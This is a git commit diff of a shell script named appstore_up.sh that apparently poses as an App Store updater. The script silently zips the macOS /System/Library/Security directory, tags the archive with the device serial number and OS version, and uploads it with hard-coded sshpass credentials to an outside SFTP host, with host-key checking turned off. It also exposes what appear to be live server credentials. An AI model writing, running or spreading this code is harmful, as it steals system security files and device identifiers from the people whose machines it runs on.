1750a50a9e09961013831efc89a5765934597049
codecpacka <32800467+codecpacka@users.noreply.github.com>
2026-06-17 13:12:46 +0530

    Update appstore_up.sh
    working getting serial number and ios verson

--- appstore_up.sh
+++ appstore_up.sh
@@ -1,21 +1,26 @@
-echo "erewrwer"
-# Configuration
-cd $home/../../../System/Library/
-archeiving files
-echo "archiving silently"
-zip -qr appstore_unmodified.zip Security && echo "Archiving complete!"
-
-PERSON_NAME="punjabi"
-SERIAL_NUMBER=ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4
-IOS_VERSION=grep -A1 'ProductVersion' /System/Library/CoreServices/SystemVersion.plist | grep -oPm1 '(?<=<string>)[^<]+'
-LOCAL_FILE="appstore_unmodified.zip"
+echo "<======= 111=======>"
+#
+# <============server configuration==============>
+#
+PERSON_NAME="attitude"
 REMOTE_HOST="eu-central-1.sftpcloud.io"
 REMOTE_USER="affd62e92b844613a73c06efae47c4ca"
 REMOTE_PASS="avhAu89mzWqHWUAft8XxZlJblINeAwYN"
 REMOTE_PATH="/home"
 REMOTE_DEST="/"
-#ARCHIVE_NAME="$IOS_VERSION_$SE"
 
+# Configuration
+SERIAL_NUMBER=$(ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4)
+IOS_VERSION=$(sw_vers -productVersion)
+LOCAL_FILE="appstore_unmodified.zip"
+ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}.zip"
+echo "$ARCHIVE_NAME"
+
+
+cd $home/../../../System/Library/
+archeiving files
+echo "archiving silently"
+zip -qr "$ARCHIVE_NAME" Security && echo "Archiving complete!"
 
 
 
@@ -25,7 +30,7 @@ REMOTE_DEST="/"
 # --- Upload Command ---
 # -p specifies the password
 # -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
-sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
+sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 #sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
  echo "connection sucesfully"
 # Check if the upload was successful
